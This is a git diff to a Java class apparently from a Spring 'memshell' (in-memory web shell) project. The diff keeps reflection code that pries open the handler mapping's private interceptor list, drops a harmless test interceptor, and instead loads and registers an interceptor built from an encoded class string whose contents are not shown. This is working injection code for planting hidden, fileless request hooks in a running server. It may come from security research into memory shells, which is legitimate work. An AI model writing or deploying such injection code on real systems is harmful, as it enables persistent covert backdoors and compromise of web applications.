@@ -15,6 +15,8 @@ import javax.servlet.http.HttpServletResponse;
 import java.lang.reflect.Field;
 import java.util.List;
 
+import static org.su18.memshell.spring.controller.DynamicUtils.INTERCEPTOR_CLASS_STRING;
+
 /**
  * 访问此接口动态添加 Interceptor
  *
@@ -37,23 +39,9 @@ public class AddInterceptor {
 		Field f = mapping.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("adaptedInterceptors");
 		f.setAccessible(true);
 		List<HandlerInterceptor> list = (List<HandlerInterceptor>) f.get(mapping);
-		list.add(new TestInterceptor());
+		list.add((HandlerInterceptor) DynamicUtils.getClass(INTERCEPTOR_CLASS_STRING).newInstance());
 		response.getWriter().println("interceptor added");
 
 
 	}
-
-
-	/**
-	 * 自定义拦截器加入文字
-	 */
-	public static class TestInterceptor implements HandlerInterceptor {
-
-		@Override
-		public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
-			response.getWriter().println("i'm interceptor~");
-			return true;
-		}
-	}
-
 }
